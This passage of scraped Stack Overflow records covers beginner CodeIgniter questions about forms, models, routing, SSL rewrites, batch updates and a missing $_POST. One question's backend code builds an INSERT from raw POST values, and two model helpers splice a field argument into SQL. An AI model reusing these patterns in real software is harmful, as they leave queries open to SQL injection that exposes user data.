Code:</p>\n\n<pre><code>&lt;?php include(\"vh.php\"); ?&gt;\n&lt;script type=\"text/javascript\"&gt;\n    $(document).ready(function() {\n    var birthdate = $(\"#birthdate\").val();\n    var sex = $(\"#sex :selected\").val();\n    var interestedIn = $(\"#interestedIn :selected\").val();\n    var relationshipStatus = $(\"#relationshipStatus :selected\").val();\n    var knownLanguages = $(\"#knownLanguages\").val();\n    var religiousViews = $(\"#religiousViews\").val();\n    var politicalViews = $(\"#politicalViews\").val();\n    var aboutMe = $(\"#aboutMe\").val();\n    var mobilePhone = $(\"#mobilePhone\").val();\n    var neighborhood = $(\"#neighborhood\").val();\n    var website = $(\"#website\").val();\n    var email = $(\"#email\").val();\n\n    $(\"#submitForm\").live('click', function() {\n        updateUserInfo();\n    });\n\n    function updateUserInfo() {\n        jQuery.ajax({\n            type: \"POST\",\n            dataType: \"JSON\",\n            url: \"&lt;?=base_url()?&gt;index.php/regUserDash/updateUserInfo\",\n            data: { birthdate: birthdate,\n                    sex: sex,\n                    interestedIn: interestedIn,\n                    relationshipStatus: relationshipStatus,\n                    knownLanguages: knownLanguages,\n                    religiousViews: religiousViews,\n                    politicalViews: politicalViews,\n                    aboutMe: aboutMe,\n                    mobilePhone: mobilePhone,\n                    neighborhood: neighborhood,\n                    website: website,\n                    email: email\n            }, success: function(data) {\n            if(data.userInfoUpdated == true) {\n                alert(\"hello\");\n            }\n          }\n       });\n    }\n    });\n&lt;/script&gt;\n&lt;?php $selectedId = $_REQUEST['id'];\n      $myuserid = $this-&gt;session-&gt;userdata('userid'); ?&gt;\n                        &lt;table style=\"width: 34%\"&gt;\n                                &lt;tr&gt;\n                                    &lt;td style=\"width: 193px\"&gt;&lt;span class=\"font1\"&gt;Birthdate&lt;/span&gt;&lt;/td&gt;\n                                    &lt;td style=\"width: 275px\"&gt;\n                                    &lt;input id=\"birthdate\" class=\"textbox1\" style=\"width: 200pt\" type=\"text\" /&gt;&lt;/td&gt;\n                                &lt;/tr&gt;\n                                &lt;tr&gt;\n                                    &lt;td style=\"width: 193px\"&gt;&lt;span class=\"font1\"&gt;Sex&lt;/span&gt;&lt;/td&gt;\n                                    &lt;td style=\"width: 275px\"&gt;\n                                    &lt;select class=\"textbox1\" id=\"sex\" style=\"width: 207pt\"&gt;\n                                    &lt;option selected=\"selected\"&gt;Select your sex&lt;/option&gt;\n                                    &lt;option&gt;Male&lt;/option&gt;\n                                    &lt;option&gt;Female&lt;/option&gt;\n                                    &lt;/select&gt;&lt;/td&gt;\n                                &lt;/tr&gt;\n                                &lt;tr&gt;\n                                    &lt;td style=\"width: 193px\" class=\"font1\"&gt;Interested In&lt;/td&gt;\n                                    &lt;td style=\"width: 275px\"&gt;\n                                    &lt;select class=\"textbox1\" id=\"interestedIn\" style=\"width: 207pt\"&gt;\n                                    &lt;option selected=\"selected\"&gt;Select your interest&lt;/option&gt;\n                                    &lt;option&gt;Men&lt;/option&gt;\n                                    &lt;option&gt;Women&lt;/option&gt;\n                                    &lt;/select&gt;&lt;/td&gt;\n                                &lt;/tr&gt;\n                                &lt;tr&gt;\n                                    &lt;td style=\"width: 193px\" class=\"font1\"&gt;Relationship Status&lt;/td&gt;\n                                    &lt;td style=\"width: 275px\"&gt;\n                                    &lt;select class=\"textbox1\" id=\"relationshipStatus\" style=\"width: 207pt\"&gt;\n                                    &lt;option selected=\"selected\"&gt;Select your relationship status&lt;/option&gt;\n                                    &lt;option&gt;Single&lt;/option&gt;\n                                    &lt;option&gt;In a relationship&lt;/option&gt;\n                                    &lt;option&gt;Engaged&lt;/option&gt;\n                                    &lt;option&gt;Married&lt;/option&gt;\n                                    &lt;option&gt;It's complicated&lt;/option&gt;\n                                    &lt;option&gt;In an open relationship&lt;/option&gt;\n                                    &lt;option&gt;Widowed&lt;/option&gt;\n                                    &lt;option&gt;Seperated&lt;/option&gt;\n                                    &lt;option&gt;Divorsed&lt;/option&gt;\n                                    &lt;option&gt;In a civil union&lt;/option&gt;\n                                    &lt;option&gt;In a domestic partnership&lt;/option&gt;\n                                    &lt;/select&gt;&lt;/td&gt;\n                                &lt;/tr&gt;\n                                &lt;tr&gt;\n                                    &lt;td style=\"width: 193px\" class=\"font1\"&gt;Known Languages&lt;/td&gt;\n                                    &lt;td style=\"width: 275px\"&gt;\n                                    &lt;input class=\"textbox1\" id=\"knownLanguages\" style=\"width: 200pt\" type=\"text\" /&gt;&lt;/td&gt;\n                                &lt;/tr&gt;\n                                &lt;tr&gt;\n                                    &lt;td style=\"width: 193px\" class=\"font1\"&gt;Religious Views&lt;/td&gt;\n                                    &lt;td style=\"width: 275px\"&gt;\n                                    &lt;input class=\"textbox1\" id=\"religiousViews\" style=\"width: 200pt\" type=\"text\" /&gt;&lt;/td&gt;\n                                &lt;/tr&gt;\n                                &lt;tr&gt;\n                                    &lt;td style=\"width: 193px\" class=\"font1\"&gt;Political Views&lt;/td&gt;\n                                    &lt;td style=\"width: 275px\"&gt;\n                                    &lt;input class=\"textbox1\" id=\"politicalViews\" style=\"width: 200pt\" type=\"text\" /&gt;&lt;/td&gt;\n                                &lt;/tr&gt;\n                                &lt;tr&gt;\n                                    &lt;td style=\"width: 193px\" class=\"font1\"&gt;About Me&lt;br /&gt;\n                                    &lt;br /&gt;\n                                    &lt;br /&gt;\n                                    &lt;br /&gt;\n                                    &lt;/td&gt;\n                                    &lt;td style=\"width: 275px\"&gt;\n                                    &lt;textarea class=\"textarea2\" id=\"aboutMe\" style=\"width: 198pt; height: 93px\"&gt;&lt;/textarea&gt;&lt;/td&gt;\n                                &lt;/tr&gt;\n                                &lt;tr&gt;\n                                    &lt;td style=\"width: 193px\" class=\"font1\"&gt;Mobile Phone&lt;/td&gt;\n                                    &lt;td style=\"width: 275px\"&gt;\n                                    &lt;input class=\"textbox1\" id=\"mobilePhone\" style=\"width: 200pt\" type=\"text\" /&gt;&lt;/td&gt;\n                                &lt;/tr&gt;\n                                &lt;tr&gt;\n                                    &lt;td style=\"width: 193px\" class=\"font1\"&gt;Neighborhood&lt;/td&gt;\n                                    &lt;td style=\"width: 275px\"&gt;\n                                    &lt;input class=\"textbox1\" id=\"neighborhood\" style=\"width: 200pt\" type=\"text\" /&gt;&lt;/td&gt;\n                                &lt;/tr&gt;\n                                &lt;tr&gt;\n                                    &lt;td style=\"width: 193px\" class=\"font1\"&gt;Website&lt;/td&gt;\n                                    &lt;td style=\"width: 275px\"&gt;\n                                    &lt;input class=\"textbox1\" id=\"website\" style=\"width: 200pt\" type=\"text\" /&gt;&lt;/td&gt;\n                                &lt;/tr&gt;\n                                &lt;tr&gt;\n                                    &lt;td style=\"width: 193px\" class=\"font1\"&gt;Email&lt;/td&gt;\n                                    &lt;td style=\"width: 275px\"&gt;\n                                    &lt;input class=\"textbox1\" id=\"email\" style=\"width: 200pt\" type=\"text\" /&gt;&lt;/td&gt;\n                                &lt;/tr&gt;\n                                &lt;tr&gt;\n                                    &lt;td style=\"width: 193px\" class=\"font1\"&gt;&amp;nbsp;&lt;/td&gt;\n                                    &lt;td style=\"width: 275px; text-align: right\"&gt;\n                                    &lt;input id=\"submitForm\" type=\"button\" value=\"Submit\" style=\"width: 63px; height: 28px\" class=\"button1\"&gt;&lt;/td&gt;\n                                &lt;/tr&gt;\n                            &lt;/table&gt;\n</code></pre>\n\n<p>Backend Code:</p>\n\n<pre><code>public function updateUserInfo() {\n        $userid = $this-&gt;session-&gt;userdata('userid');\n        $birthdate = $this-&gt;input-&gt;post(\"birthdate\");\n        $sex = $this-&gt;input-&gt;post(\"sex\");\n        $interestedIn = $this-&gt;input-&gt;post(\"interestedIn\");\n        $relationshipStatus = $this-&gt;input-&gt;post(\"relationshipStatus\");\n        $languages = $this-&gt;input-&gt;post(\"languages\");\n        $religiousViews = $this-&gt;input-&gt;post(\"religiousViews\");\n        $politicalViews = $this-&gt;input-&gt;post(\"politicalViews\");\n        $aboutMe = $this-&gt;input-&gt;post(\"aboutMe\");\n        $mobilePhone = $this-&gt;input-&gt;post(\"mobilePhone\");\n        $neighborhood = $this-&gt;input-&gt;post(\"neighborhood\");\n        $websites = $this-&gt;input-&gt;post(\"websites\");\n        $email = $this-&gt;input-&gt;post(\"email\");\n\n        $this-&gt;db-&gt;query(\"INSERT INTO user_info (birthdate, sex, interestedIn, relationshipStatus, Languages, religiousViews, politicalViews, aboutMe, mobilePhone, neighborhood, websites, email, userid)\n                          VALUES('{$birthdate}', '{$sex}', '{$interestedIn}', '{$relationshipStatus}', '{$languages}', '{$religiousViews}', '{$politicalViews}', '{$aboutMe}', '{$mobilePhone}', '{$neighborhood}', '{$websites}', '{$email}', '{$userid}')\");\n\n        echo json_encode(array('userInfoUpdated' =&gt; true));\n    }\n</code></pre>\n"},{"tags":["database","codeigniter","content-management-system","add"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":118,"score":1,"question_id":12267476,"title":"Add to the database using codeigniter [RESOLVED]","body":"<p>I am currently trying to add data to the database using codeigniter. I have already set up a registration page using the active method and attempted to use the same method for the add news form but was unsuccessful. When i click submit it is saying page cannot be found and the url shows the controller function name. This is the same when i purposely leave any fields blank. I have checked my database and no records have been added and no php log errors. Here is my snippets of code:</p>\n\n<p>View:</p>\n\n<pre><code>&lt;?php echo form_open('add/add_article'); ?&gt;\n        &lt;?php echo form_input('title', set_value('title', 'Title')); ?&gt;&lt;br /&gt;\n        &lt;?php echo form_textarea('content', set_value('content', 'Content')); ?&gt;&lt;br /&gt;\n        &lt;?php echo form_input('author', set_value('author', 'Author')); ?&gt;\n        &lt;?php echo form_submit('submit', 'Add Article'); ?&gt;\n        &lt;?php echo validation_errors('&lt;p class=\"error\"&gt;' );?&gt;\n  &lt;?php echo form_close(); ?&gt;\n</code></pre>\n\n<p>Controller:  </p>\n\n<pre><code>class Add extends CI_Controller {\n\n    public function __construct() {\n        parent::__construct();\n    }\n\n    public function index() {\n        $this-&gt;load-&gt;view('admin/add');\n}\n\n    public function add_article() {\n        $this-&gt;load-&gt;library('form_validation');\n\n        $this-&gt;form_validation-&gt;set_rules('title', 'Title', 'trim|required');\n        $this-&gt;form_validation-&gt;set_rules('content', 'Content', 'trim|required');\n        $this-&gt;form_validation-&gt;set_rules('author', 'Author', 'trim|required');\n\n        if($this-&gt;form_validation-&gt;run() == FALSE) {\n\n        $this-&gt;index();\n\n        }else{\n\n            $this-&gt;load-&gt;model('news_model');\n            if($query = $this-&gt;news_model-&gt;addArticle()) {\n            $this-&gt;load-&gt;view('news');\n            }else {\n                $this-&gt;load-&gt;view('news');\n        }\n    }   \n}\n}\n</code></pre>\n\n<p>Model:</p>\n\n<pre><code>    public function __construct() {\n        parent::__construct();\n    }\n\n            function addArticle() {\n        $data =array(\n        'title' =&gt; $this-&gt;input-&gt;post('title'),\n        'content' =&gt; $this-&gt;input-&gt;post('content'), \n        'author' =&gt; $this-&gt;input-&gt;post('author'),\n        'username' =&gt; $this-&gt;input-&gt;post('username'));\n\n        $insert = $this-&gt;db-&gt;insert('news', $data);\n        return $insert;\n    }\n     }\n</code></pre>\n\n<p>Any guidance would be of help please :).</p>\n\n<hr>\n\n<p>NEW WORKING UPDATE CODE:</p>\n\n<p>From the controller i used the same code apart from:</p>\n\n<pre><code>      $this-&gt;load-&gt;view('admin/news');\n</code></pre>\n\n<p>This directed me back to the news page however my current news articles would not show saying variables and foreach method was not found as well as controller name still in url. This was resolved by using:</p>\n\n<pre><code>        redirect('admin/news');\n</code></pre>\n\n<p>When adding a new article the date was showing 00-00-0000 so i added this to the top of my data array in the news_model (with 'date' being the name of my column):</p>\n\n<pre><code>        $data['date'] =  date('Y-m-d H:i:s');\n</code></pre>\n\n<p>On the view, i changed the form_open info to:</p>\n\n<pre><code>        &lt;?php echo form_open('admin/add/add_article'); ?&gt;\n</code></pre>\n\n<p>This now works perfectly and when there are any fields left or filled in incorrect, the error message is echoed back to the add page under the fields.</p>\n"},{"tags":["php","oop","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12414276,"title":"Getting a \"Call to a member function function() on a non-object\" error in code igniter","body":"<p>I'm very new to CodeIgniter and not an expert in OOP so please bear with me.</p>\n\n<p>This is the function I have in my model:</p>\n\n<pre><code>function get_company(int $user_id, $fields = '*'){\n    $r = $this-&gt;db-&gt;query(\"SELECT $fields FROM \".$this-&gt;db-&gt;dbprefix('companies').\" WHERE user_id=?\", $user_id)-&gt;row();\n    return $r;        \n}\nfunction get_profile($user_id, $fields = '*'){\n    $r = $this-&gt;db-&gt;query(\"SELECT $fields FROM \".$this-&gt;db-&gt;dbprefix('users_profiles').\" WHERE user_id=?\", $user_id)-&gt;row();\n    return $r;        \n}\n</code></pre>\n\n<p>This is in my controller that is calling that model:</p>\n\n<pre><code>function index(){ \n    $this-&gt;load-&gt;model('profiles_m');\n    $profile = $this-&gt;profiles_m-&gt;get_profile($this-&gt;access-&gt;getUid());\n    $company = $this-&gt;profile_m-&gt;get_company($this-&gt;access-&gt;getUid());      \n\n    $vars = array(\n            'profile'=&gt;$profile, \n            'company'=&gt;$company,        \n        );\n\n    $this-&gt;_getTemplate()-&gt;build('account', $vars);\n}\n</code></pre>\n\n<p>An in my view:</p>\n\n<pre><code>$company = array(\n        'name'     =&gt; 'company',\n        'id'          =&gt; 'company',\n        'value'       =&gt; \"$company-&gt;name\",\n        'class'       =&gt; 'styl_f validate[required] text-input input-xlarge',\n        'placeholder' =&gt; \"$company-&gt;name\"\n);\n\necho $company['value']\n</code></pre>\n\n<p>The error I am getting is this: <code>Call to a member function get_company() on a non-object in C:\\..\\application\\modules\\accounts\\controllers\\accounts.php</code>\nI am under the impression that I am receiving these errors because I am passing a non object through get_company() but the thing that confuses me is that this error does not come up for get_profile(); The get_profile() function in my model is very similiar to my get_company() function. What is causing this error? How can I get rid of it?</p>\n"},{"tags":["php","xml","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12417718,"title":"How do I generate a php dynamic date from an xml file?","body":"<p>We have a codeigniter site where basically all the content seen on pages is pulled from xml files. I am not all that familiar with codeigniter so I am having a bit of trouble grasping how to tackle this issue.</p>\n\n<p>For example, the xml file might have this:</p>\n\n<pre><code>&lt;view&gt;home&lt;/view&gt;\n    &lt;meta&gt;\n        &lt;keywords&gt;blue widgets, green widgets, red widgets&lt;/keywords&gt;\n        &lt;description&gt;We have the best widgets for 2012&lt;/description&gt;\n    &lt;/meta&gt;\n</code></pre>\n\n<p>Ultimately what I would like to do is just make the date wherever it might appear in our content use a php date function, so:</p>\n\n<pre><code>&lt;view&gt;home&lt;/view&gt;\n    &lt;meta&gt;\n        &lt;keywords&gt;blue widgets, green widgets, red widgets&lt;/keywords&gt;\n        &lt;description&gt;We have the best widgets for {somehow put php date here}&lt;/description&gt;\n&lt;/meta&gt;\n</code></pre>\n\n<p>Is there anyway I can do this from the XML file or am I approaching in the wrong way?</p>\n"},{"tags":["php","javascript","codeigniter","autocomplete"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12417384,"title":"How to display individual datas in mysql through jquery autocomplete","body":"<p>I am having a problem here\nI want to display the datas in DB using autocomplete\nBut when I search in the textbox it is showing everything\nfor example </p>\n\n<pre><code>c++javaphpcoldfusionjavascriptaspruby\n</code></pre>\n\n<p>but what I want is</p>\n\n<pre><code>\"c++\", \"java\", \"php\", \"coldfusion\", \"javascript\", \"asp\", \"ruby\"\n</code></pre>\n\n<p>here is my code</p>\n\n<p>Controller </p>\n\n<pre><code> function get_ingredients() {\n          $this-&gt;load-&gt;helper(array('form', 'url'));\n        $this-&gt;load-&gt;library('form_validation');\n\n             $this-&gt;load-&gt;model(\"save_datas\");\n        $data[\"show_ingre\"] = $this-&gt;save_datas-&gt;select_ingredient();\n        $this-&gt;load-&gt;view(\"view_home\", $data);\n    }\n</code></pre>\n\n<p>View</p>\n\n<pre><code>&lt;script&gt;\n            $(document).ready(function() {\n                $(\"input#autocomplete\").autocomplete({\n                    source: [\"&lt;?php\nforeach ($show_ingre as $ingre) {\n    echo \"$ingre-&gt;ingredient\";\n}\n?&gt;\"]\n\n\n                    });\n                });\n        &lt;/script&gt;\n\n   &lt;?php echo form_open('home/save_input'); ?&gt;\n        &lt;input type=\"text\" name=\"ingredient\" id=\"autocomplete\" /&gt;&lt;br/&gt;\n        &lt;input type=\"submit\" name=\"submit\"/&gt;\n        &lt;?php form_close(); ?&gt;\n</code></pre>\n\n<p>Model</p>\n\n<pre><code>function select_ingredient() {\n        $query = $this-&gt;db-&gt;query(\"SELECT ingredient FROM ingredients\");\n        return $query-&gt;result();\n    }\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3139,"score":1,"question_id":9545081,"title":"Codeigniter Error \"Unable to connect to your database server using the provided settings\"","body":"<p>When I trying upload this project on my domain m facing error \"Unable to connect to your database server using the provided settings\"</p>\n\n<p>I have checked my <strong>config.php</strong> and <strong>database.php</strong> file and all the information are correct:\n</p></p>\n\n<pre><code> $db['default']['hostname'] = \"etc.com\";\n $db['default']['username'] = \"etc\"; \n $db['default']['password'] = \"etc@etc\";\n $db['default']['database'] = \"visiting_link\";\n $db['default']['dbdriver'] = \"mysql\";\n $db['default']['dbprefix'] = \"\";\n $db['default']['pconnect'] = TRUE;\n $db['default']['db_debug'] = TRUE;\n $db['default']['cache_on'] = FALSE;\n $db['default']['cachedir'] = \"\";\n $db['default']['char_set'] = \"utf8\";\n $db['default']['dbcollat'] = \"utf8_general_ci\"; \n</code></pre>\n\n<p>Is any solution to that problem? please refer any helping material.\nI am using fileZilla. <br/>\nThanks !</p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":12065596,"title":"How to massive delete in php-activerecord where id NOT in list?","body":"<p>I'm running a CodeIgniter application with PHP-Activerecord installed and I need to do a massive delete.  The PHP-AR library supports massive update and delete, but the function only takes the ids that you want to delete/update.  I'm trying to do a massive delete where the ids are NOT in the list.</p>\n\n<blockquote>\n  <p>delete from table where id not in (1,2,3...,500)</p>\n</blockquote>\n\n<p>Unfortunately, the PHP-Activerecord website is of no help, and their forums are so horribly built (no search... seriously?) that I'm truly stuck.</p>\n\n<p><strong>edit:</strong> Please note, <strong>CodeIgniter's built-in ORM is not the same as PHP-Activerecord.</strong>  Just thought I'd clarify that. </p>\n"},{"tags":["codeigniter","routing","hmvc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12416951,"title":"Module specific routing using hmvc in code igniter?","body":"<p>I am using Code igniter with HMVC,</p>\n\n<p>We are creating drop-in modules.</p>\n\n<p>One thing I am a bit stuck on though is the routing.</p>\n\n<p>I can add </p>\n\n<pre><code>$route['gallery/categories'] = 'gallery/categorieseditor';\n$route['gallery/categories/(:any)] = 'gallery/categorieseditor/$1';\n</code></pre>\n\n<p>to the main routes.php config file and it works fine.</p>\n\n<p>But I don't want to have to edit the main routes file for the modules.</p>\n\n<p>I was hoping I could just drop this into a <code>routes.php</code> file  in <code>/modules/gallery/config/</code> But visiting the url just gives me a 404 (accessing <code>/gallery/categorieseditor</code> works).</p>\n\n<p>How can I get this up and running?</p>\n"},{"tags":["codeigniter","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12414809,"title":"code igniter & mod_rewrite - one rewrite rule breaking another","body":"<p>I have a site built in codeigniter. We use short urls from our database &amp; rewrite rules to redirect them to their full path.</p>\n\n<p>For example,</p>\n\n<pre><code>RewriteRule ^secure-form$ form/contract/secure-form [L]\n</code></pre>\n\n<p>This works fine by itself.  But I would like to use SSL on certain pages.  I have edited the code so that if you go to one of these pages, all instances of http:// within the page are replaced with https:// but I need to rewrite the url to use it as well.</p>\n\n<p>The pages all use the same template and all the content comes from the database so I can't just specify ssl on a particular directory. </p>\n\n<p>The url's for the secure pages all start with 'secure' so I wrote the following rules and placed them above the other rewrites.</p>\n\n<pre><code>RewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} ^/secure/?.*$\nRewriteRule ^(.*)$ https://%{HTTP_HOST}/$1 [R=301,L]\n\nRewriteCond %{HTTPS} on \nRewriteCond %{REQUEST_URI} !^/secure/?.*$\nRewriteRule ^(.*)$ http://%{HTTP_HOST}/$1 [R=301,L]\n\nRewriteRule ^secure-form$ form/contract/secure-form [L]\nRewriteRule ^secure-different-form$ form/contract/secure-different-form [L]\nall other rewrite rules for specific pages follow\n\nthen the default rewrite further down...\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n\n<p>The problem is that when I add the rules to change the protocol, it ends up displaying 'form/contract/secure-form' in the url instead of 'secure-form'.  </p>\n\n<p>This renders the actual form on the page broken since it uses that url to build itself.</p>\n\n<p>If I take out the rules that change the protocol, it displays secure-form in the url as it should, but the page is not secure.</p>\n\n<p>What am I doing wrong?</p>\n\n<p>----UPDATE----\nOoh, after over 20 hrs of searching, I think I finally have an answer. So, first time through, https is off &amp; gets turned on.  Then, because of the 301, it's run again &amp; the page gets sent to form/contract/secure...  But this time, https is on.  Since the uri no longer STARTS with secure, it turns https off.</p>\n\n<p>Hopefully, this will help someone else.  </p>\n"},{"tags":["php","mysql","codeigniter","bigdata"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12415822,"title":"Breaking Up Massive MySQL Update","body":"<p>Right now I have something like this in my CodeIgniter model: </p>\n\n<pre><code>&lt;?php \n$array = array(...over 29k IDs...);\n$update = array();\nforeach ($array as $line) {\n   $update[] = array('id' =&gt; $line, 'spintax' =&gt; $this-&gt;SpinTax($string));\n   ### $this-&gt;SpinTax parses the spintax from a string I have. It has to be generated for each row.\n}\n$this-&gt;db-&gt;update_batch('table', $update, 'id');\n?&gt;\n</code></pre>\n\n<p>The first 20k records get updated just fine, but I get a <code>504 Gateway Time-out</code> before it completes. </p>\n\n<p>I have tried increasing the nginx server timeout to something ridiculous (like 10 minutes), and I still get the error. </p>\n\n<p>What can I do to make this <strong>not</strong> timeout. I've read many answers and HOW-TOs to segment the update, but I continue to get the server timeout. A <code>PHP</code> or CodeIgniter solution would be excellent, and I need to deploy this code to multiple servers that might not be using <code>nginx</code> (similar error in Apache). </p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","forms","codeigniter","post"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":199,"score":4,"question_id":12414994,"title":"$_POST is empty data in PHP","body":"<p>I'm having an odd issue with my $_POST data not coming through. First, this works fine on my local host, but doesn't work on my shared host on the web. Here's the form:</p>\n\n<pre><code>&lt;form action=\"/add\" method=\"POST\" enctype=\"multipart/form-data\"&gt;\n\n&lt;div&gt;\n    Name : &lt;input type='text' name='form[name]' class='form-text ' value=\"\" style='width: 350px' placeholder=\"I.E. Boulder Vote Bus\" maxlength=\"30\"/&gt;\n&lt;/div&gt;\n&lt;div&gt;\n    Description : &lt;textarea name='form[description]' class='form-bigbox '/&gt;&lt;/textarea&gt;\n&lt;/div&gt;\n&lt;div class='clearfix pull-left'&gt;\n    Logo: &lt;input type=\"file\" name='form[image_name]' class='' value=\"\" accept=\"image/jpeg, image/jpg, image/png\"/&gt;\n&lt;/div&gt;\n&lt;div class='clearfix'&gt;&lt;/div&gt;\n&lt;div&gt;\n    &lt;span id='date' class='change'&gt;\n        Date : &lt;input type='text' name='form[date]' id='datepicker' class='form-text ' placeholder=\"mm/dd/yyyy\" value=\"\" style='width: 160px;'/&gt; \n    &lt;/span&gt;\n    Time : &lt;input type='text' name='form[hr]' class='form-text ' style='width: 40px;' placeholder=\"01\" value=\"\"/&gt; : &lt;input type='text' style='width: 40px;' name='form[min]' class='form-text ' placeholder=\"00\" value=\"\"/&gt; &lt;select name='form[ampm]' class='form-text form-select' style='width: 60px;'&gt;&lt;option value='am' &gt;AM&lt;/option&gt;&lt;option value='pm' &gt;PM&lt;/option&gt;&lt;/select&gt;\n&lt;/div&gt;\n&lt;div&gt;\n    Your Email : &lt;input type='text' name='form[email]' class='form-text '  value=\"\" style='width: 350px' placeholder=\"hero@voterides.com\"/&gt;\n&lt;/div&gt;\n&lt;div&gt;\n    Zip code : &lt;input type='text' name='form[zipcode]' class='form-text '  value=\"\" placeholder=\"80304\"/&gt; Radius : &lt;input type='text' name='form[radius]' class='form-text '  value=\"\" placeholder=\"25\" style='width:50px;'/&gt; mi\n&lt;/div&gt;\n                    &lt;div&gt;\n                            &lt;input type='submit' class='form-submit btn-warning' value='Create a Ride' /&gt;\n&lt;/div&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>Problem is, after I submit the form, I have no $_POST data. If I do <code>echo serialize($_POST);</code> I get <code>a:0:{}</code>. However, if I do, <code>echo file_get_contents('php://input');</code> I get the following:</p>\n\n<pre><code>------WebKitFormBoundaryLCabCxfMMHCvWsAO\n\nContent-Disposition: form-data; name=\"form[name]\"\n\n\n\nSome Name\n\n------WebKitFormBoundaryLCabCxfMMHCvWsAO\n\nContent-Disposition: form-data; name=\"form[description]\"\n\n\n\nSome Description\n\n------WebKitFormBoundaryLCabCxfMMHCvWsAO\n\nContent-Disposition: form-data; name=\"form[image_name]\"; filename=\"\"\n\nContent-Type: application/octet-stream\n\n\n\n\n\n------WebKitFormBoundaryLCabCxfMMHCvWsAO\n\nContent-Disposition: form-data; name=\"form[date]\"\n\n\n\n\n\n------WebKitFormBoundaryLCabCxfMMHCvWsAO\n\nContent-Disposition: form-data; name=\"form[hr]\"\n\n\n\n\n\n------WebKitFormBoundaryLCabCxfMMHCvWsAO\n\nContent-Disposition: form-data; name=\"form[min]\"\n\n\n\n\n\n------WebKitFormBoundaryLCabCxfMMHCvWsAO\n\nContent-Disposition: form-data; name=\"form[ampm]\"\n\n\n\nam\n\n------WebKitFormBoundaryLCabCxfMMHCvWsAO\n\nContent-Disposition: form-data; name=\"form[email]\"\n\n\n\n\n\n------WebKitFormBoundaryLCabCxfMMHCvWsAO\n\nContent-Disposition: form-data; name=\"form[zipcode]\"\n\n\n\n\n\n------WebKitFormBoundaryLCabCxfMMHCvWsAO\n\nContent-Disposition: form-data; name=\"form[radius]\"\n\n\n\n\n\n------WebKitFormBoundaryLCabCxfMMHCvWsAO--\n</code></pre>\n\n<p>Furthermore, and odder, if I take the form down to just 3 elements, it works. Any 3 elements are fine, but 4 and it doesn't work. Additionally, other forms on the site (with more than 3 elements) work just fine. It's just this one.</p>\n\n<p>Here are some relevant PHP settings from my shared host:</p>\n\n<pre><code>PHP Version 5.3.16\nmax_execution_time  300 \nmax_file_uploads    20  \nmax_input_time  -1  -1\nmax_input_vars  1000    1000\nmemory_limit    128M    128M\npost_max_size   500M    500M \n</code></pre>\n\n<p>If it's a server setting, any idea what it could be? Seems like a size issue, but there just isn't that much data being passed (all of these are small values).</p>\n\n<p>I have an htaccess, but I don't think it's related (I'm using codeigniter, and it's the standard CI htaccess, and my other forms submit a-ok):</p>\n\n<pre><code>AddDefaultCharset UTF-8\n&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #When your application folder isn't in the system folder\n    #This snippet prevents user access to the application folder\n    #Submitted by: Fabdrol\n    #Rename 'application' to your applications folder name.\n    RewriteCond %{REQUEST_URI} ^application.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Here's what print_r($_SERVER) produces (slightly redacted for security sake):</p>\n\n<pre><code>Array\n(\n    [CONTENT_LENGTH] =&gt; 1077\n    [CONTENT_TYPE] =&gt; multipart/form-data; boundary=----WebKitFormBoundarydBnbAkAUNJntI6dz\n    [DOCUMENT_ROOT] =&gt; [redaced]\n    [GATEWAY_INTERFACE] =&gt; CGI/1.1\n    [HTTP_ACCEPT] =&gt; text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n    [HTTP_ACCEPT_CHARSET] =&gt; ISO-8859-1,utf-8;q=0.7,*;q=0.3\n    [HTTP_ACCEPT_ENCODING] =&gt; gzip,deflate,sdch\n    [HTTP_ACCEPT_LANGUAGE] =&gt; en-US,en;q=0.8\n    [HTTP_CACHE_CONTROL] =&gt; max-age=0\n    [HTTP_CONNECTION] =&gt; keep-alive\n    [HTTP_COOKIE] =&gt; 